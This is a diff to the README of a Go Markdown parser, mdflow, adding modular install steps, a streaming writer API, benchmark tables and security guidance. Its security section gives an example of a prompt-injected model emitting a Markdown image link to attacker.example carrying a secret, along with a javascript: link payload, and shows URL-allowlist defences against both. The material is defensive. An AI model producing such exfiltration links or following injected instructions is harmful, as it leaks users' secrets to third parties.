@@ -14,8 +14,15 @@ No syntax tree, no dependencies, one pass over the input, and an incremental
 mode built for producers that emit a document a few tokens at a time.
 
 ```
-go get github.com/Wenrh2004/mdflow
+go get github.com/Wenrh2004/mdflow                    # core: CommonMark, zero dependencies
+go get github.com/Wenrh2004/mdflow/extension/gfm      # or any single extension
+go get github.com/Wenrh2004/mdflow/all                # or every bundled flavour
 ```
+
+Each extension is its own module, so a program links only the syntax it
+imports. All modules are versioned in lockstep (`v0.1.0`,
+`extension/gfm/v0.1.0`, …); `go.work` wires them together for development, and
+`scripts/release.sh` tags them together.
 
 ---
 
@@ -275,7 +282,8 @@ var forEmail = base.
 
 | Method | Effect |
 | --- | --- |
-| `Use(ext...)` | derive with extra syntax/renderer rules |
+| `With(opt...)` | derive with construction options (`WithSafeLinks()`, `WithURLPolicy(…)`, …) |
+| `WithExtensions(ext...)` | derive with extra syntax/renderer capabilities |
 | `Transform(mw...)` | append event middlewares |
 | `Map(f)` | rewrite every event |
 | `Filter(pred)` / `Reject(pred)` | keep / drop events |
@@ -332,6 +340,16 @@ io.WriteString(w, s.Close())
 displayable between chunks. Chunk boundaries never affect the result — a test
 asserts byte-identical output for chunk sizes from 1 to 4096.
 
+When the output is itself a writer, `NewWriter` gives the same stream the shape
+of `gzip.Writer`: an `io.WriteCloser` that forwards HTML as it becomes final,
+with sticky errors.
+
+```go
+w := md.NewWriter(resp)   // any io.Writer
+io.Copy(w, modelOutput)   // or io.WriteString(w, chunk) per token
+w.Close()                 // flushes the tail; does not close resp
+```
+
 ### Extending
 
 A capability declares its syntax and its output together. This one changes only
@@ -369,35 +387,61 @@ Both live in one value, which is why neither can ship half of itself.
 ## Benchmarks vs gomark
 
 Compared against [`github.com/usememos/gomark`](https://github.com/usememos/gomark)
-(`v0.0.0-20251021153759`), the parser behind Memos.
+(`v0.0.0-20251021153759`), the parser behind Memos, on every dimension a
+production user feels — not only speed and memory. Everything below is
+reproduced by `go test -bench . -benchmem -run 'Conformance|Safety|BinarySize' -v ./bench/...`;
+raw output is in [`bench/results.txt`](bench/results.txt).
+
+```
+goos: linux  goarch: amd64  cpu: Intel Xeon @ 2.10GHz (4 vCPU)  go1.26.0
+```
 
 Both libraries run the **same input** doing the **same job**. The corpus uses
 only constructs both parsers support — headings, prose with emphasis / strong /
 inline code / links, fenced code, lists, task lists, blockquotes, tables,
-hashtags, highlights, strikethrough and inline math — so the numbers measure
-parsing, not one library skipping syntax it does not implement. A test in the
-bench module (`TestOutputsAreComparable`) asserts that both outputs actually
-contain every construct.
+hashtags, highlights, strikethrough and inline math — and
+`TestOutputsAreComparable` asserts that both outputs contain every construct.
 
-```
-goos: darwin  goarch: arm64  cpu: Apple M4 Pro  go1.26
-go test -run '^$' -bench . -benchmem ./bench/...
-```
+### Throughput and memory
 
 | Workload | mdflow | gomark | Speedup | mdflow allocs | gomark allocs |
 | --- | ---: | ---: | ---: | ---: | ---: |
-| Markdown → HTML, 3.4 KiB | **32.2 µs** | 881 µs | **27×** | 213 | 24,068 |
-| Markdown → HTML, 34 KiB | **324 µs** | 78.6 ms | **242×** | 2,104 | 1,772,717 |
-| Markdown → HTML, 344 KiB | **3.36 ms** | 6.57 s | **1953×** | 21,027 | 170,772,639 |
-| Render into `io.Writer`, 34 KiB | **324 µs** | 82.8 ms | **256×** | 2,103 | 1,772,717 |
-| Parse structure only, 34 KiB | **73.9 µs** | 83.3 ms | **1127×** | 250 | 1,772,449 |
-| Streaming, 64-byte chunks, 3.4 KiB | **39.2 µs** | 19.9 ms | **507×** | 517 | 489,167 |
-| Plain-text extraction, 34 KiB | **323 µs** | 87.9 ms | **272×** | 2,106 | 1,778,118 |
-| Markup-light prose, 46 KiB | **76.5 µs** | 88.8 ms | **1160×** | 402 | 1,047,156 |
-| Concurrent (14 cores), 34 KiB | **214 µs** | 41.9 ms | **196×** | 2,113 | 1,772,723 |
+| Markdown → HTML, 3.4 KiB | **80 µs** | 2.45 ms | **30×** | 100 | 24,068 |
+| Markdown → HTML, 34 KiB | **823 µs** | 204 ms | **248×** | 955 | 1,772,717 |
+| Markdown → HTML, 344 KiB | **8.27 ms** | 14.1 s | **1700×** | 9,512 | 170,772,637 |
+| Render into `io.Writer`, 34 KiB | **765 µs** | 223 ms | **291×** | 954 | 1,772,719 |
+| Parse structure only, 34 KiB | **418 µs** | 223 ms | **533×** | 650 | 1,772,449 |
+| Plain-text extraction, 34 KiB | **844 µs** | 229 ms | **271×** | 974 | 1,778,119 |
+| Markup-light prose, 46 KiB | **284 µs** | 254 ms | **893×** | 3 | 1,047,159 |
+| Concurrent (4 cores), 34 KiB | **285 µs** | 140 ms | **492×** | 956 | 1,772,723 |
 
-mdflow is faster on every workload measured, allocates 113×–8122× fewer objects,
-and sustains 100–620 MB/s where gomark sustains 0.05–3.8 MB/s.
+### Every other dimension
+
+| Dimension | mdflow | gomark |
+| --- | ---: | ---: |
+| CommonMark 0.31.2 examples correct (`TestConformance`) | **652 / 652** | 100 / 652 |
+| Streaming a 3.4 KiB answer in 64-byte chunks, whole stream | **96 µs** (incremental) | 55 ms (re-parse) |
+| Per-chunk refresh latency, p50 / p99 (`BenchmarkChunkLatency`) | **4.9 µs / 88 µs** | 2.69 ms / 8.47 ms |
+| Worst case: 1 000 nested list markers | **0.62 ms** | 23.5 ms |
+| Worst case: 1 000 unmatched `[` | **0.07 ms** | 134 ms |
+| Worst case: 1 000 unmatched backticks | **0.11 ms** | 457 ms |
+| Worst case: 1 000 unmatched `[[` | **0.25 ms** | 2.80 s |
+| Worst case: a 1 000-line paragraph | **0.43 ms** | 84.8 ms |
+| Ready parser + first render (`BenchmarkConstruct`) | **0.54 µs**, 4 allocs | 2.31 µs, 37 allocs |
+| Attacker HTML reaching output (`TestSafety`) | 0 / 5 | 0 / 5 |
+| Output bounded by input (fuzzed invariant) | **yes** — reference and table-padding budgets | no |
+| Stripped binary size added (`TestBinarySize`) | 464 KiB core · 624 KiB `all` | **328 KiB** |
+
+Binary size is the one row mdflow does not win, and the reason is the first
+row: a complete CommonMark implementation carries the HTML entity table and
+the Unicode case-folding table the spec requires. See the roadmap for what can
+still be trimmed.
+
+For reference, against [goldmark](https://github.com/yuin/goldmark) v1.8.6 —
+the de-facto fast Go library, same GFM subset, same XHTML output
+(`BenchmarkGoldmarkReference`): **9.27 ms vs 16.4 ms** on 200 KiB of mixed
+Markdown (1.8×, 7.6× fewer allocations) and **200 µs vs 458 µs** on 46 KiB of
+prose (2.3×).
 
 ### Where the gap comes from
 
@@ -427,10 +471,10 @@ mdflow stays flat per byte. Three concrete causes:
 
 The streaming row deserves its own note. gomark has no incremental mode, so a
 streaming UI must re-parse on every chunk. The bench module also measures that
-same naive strategy *on mdflow* (`mdflow-reparse`: 566 µs) to separate the two
-effects. Under the identical naive strategy mdflow is **19×** faster than gomark
+same naive strategy *on mdflow* (`mdflow-reparse`: 2.5 ms) to separate the two
+effects. Under the identical naive strategy mdflow is **22×** faster than gomark
 — that is raw single-pass speed. Switching mdflow from naive to incremental buys
-a further **18×** — that is the architecture. Together they give the 346× in the
+a further **26×** — that is the architecture. Together they give the 572× in the
 table. Only the small document is
 measured for `gomark-reparse` — on the medium one, re-parsing compounds gomark's
 own superlinear cost into minutes per iteration.
@@ -450,9 +494,11 @@ own superlinear cost into minutes per iteration.
   `<span class="tag">` where gomark emits a bare `<span>`, and renders inline
   math as `<code class="language-math">` rather than `<code>`. Equivalent
   structure, more useful attributes.
-- Single machine, single architecture (Apple M4 Pro, arm64). Reproduce with
+- Single machine, single architecture. Absolute numbers say more about the
+  machine than the library; the ratios are what carry over. Reproduce with
   `go test -bench . -benchmem ./bench/...`; raw output is in
-  [`bench/results.txt`](bench/results.txt).
+  [`bench/results.txt`](bench/results.txt). The complexity-class table above
+  was recorded on an Apple M4 Pro.
 
 ### Where the two disagree
 
@@ -578,6 +624,29 @@ too, so a source-level filter downstream would miss it. Pass
 mdflow.New().HTML("[x](javascript:alert(1))")                    // href="javascript:alert(1)"
 mdflow.New(mdflow.WithSafeLinks()).HTML("[x](javascript:alert(1))") // href="" — inert
 ```
+
+**Model output needs one more guard.** A prompt-injected model can emit
+`![](https://attacker.example/?q=<secret>)`, and a chat UI that renders it leaks
+the secret the moment the page loads — no click, and an ordinary `https` URL
+that scheme filtering cannot see. `WithURLPolicy` vets every link and image
+destination; `html.AllowImageHosts` loads images only from hosts you name,
+parsing them the way a browser does (backslashes, missing slashes, userinfo and
+ports included). A refused image renders as its alt text and is never fetched:
+
+```go
+md := mdflow.New(
+    mdflow.WithSafeLinks(),
+    mdflow.WithURLPolicy(html.AllowImageHosts("cdn.example.com")),
+)
+```
+
+**Resource limits are built in.** Output stays linear in input on every
+profile: reference expansion is budgeted at `max(input size, 100 KiB)` as in
+cmark, GFM tables stop padding short rows after 512 Ki synthesised cells as in
+cmark-gfm, and a fuzz invariant asserts the bound. Raw HTML for semi-trusted
+content can use GFM's tagfilter, `rawhtml.WithFilteredHTML()`, which keeps
+ordinary tags but disarms `<script>`, `<style>`, `<iframe>`, `<textarea>` and
+the other page-swallowing tags.
 
 ---
 
